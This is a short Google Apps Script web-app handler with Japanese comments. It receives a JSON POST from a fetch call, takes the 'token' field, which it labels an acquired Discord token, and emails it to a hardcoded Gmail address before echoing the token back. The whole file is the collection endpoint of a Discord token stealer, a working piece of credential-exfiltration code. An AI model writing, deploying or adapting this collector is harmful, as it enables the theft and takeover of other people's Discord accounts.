function doPost(e) {
  // fetch から送られてくる JSON を解析
  var data = JSON.parse(e.postData.contents);
  var token = data.token;

  var email = "nantokazu0320@gmail.com"; // 自分のGmailアドレス
  var subject = "ディスコードトークン";
  var body = "取得したディスコードトークン: " + token;

  GmailApp.sendEmail(email, subject, body);

  // fetch に返す JSON
  return ContentService
    .createTextOutput(JSON.stringify({status: "OK", tokenReceived: token}))
    .setMimeType(ContentService.MimeType.JSON);
}
